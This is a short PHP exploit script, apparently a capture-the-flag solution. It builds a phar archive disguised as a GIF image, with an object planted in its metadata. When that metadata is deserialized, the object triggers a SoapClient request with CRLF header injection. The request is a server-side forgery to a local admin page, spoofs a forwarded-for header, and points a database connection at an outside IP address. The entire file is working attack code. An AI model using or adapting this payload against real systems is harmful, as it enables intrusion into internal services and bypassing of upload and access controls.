<?php
class File{
    public $file_name;
    public $func;

    function __construct(){
        $target = 'http://127.0.0.1/admin.php';
        $post_string = 'admin=1&clazz=Mysqli&func1=init&arg1=&func2=real_connect&arg2[0]=106.52.172.228&arg2[1]=root&arg2[2]=123&arg2[3]=test&arg2[4]=3306&func3=query&arg3=select%201&ip=123.123.123.123&port=1234';
        $headers = array(
            'X-Forwarded-For: 127.0.0.1',
        );
        $this->func = "SoapClient";
        $this->file_name = [null,array(
                'location'   => $target,
                'user_agent' => "test\r\nContent-Type: application/x-www-form-urlencoded\r\n".join("\r\n",$headers)."\r\nContent-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string,
                'uri'        => "test"
            )];
    }
}

@unlink("1.phar");
$phar = new Phar("1.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . " __HALT_COMPILER();");
$o = new File();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
rename("1.phar", "1.gif");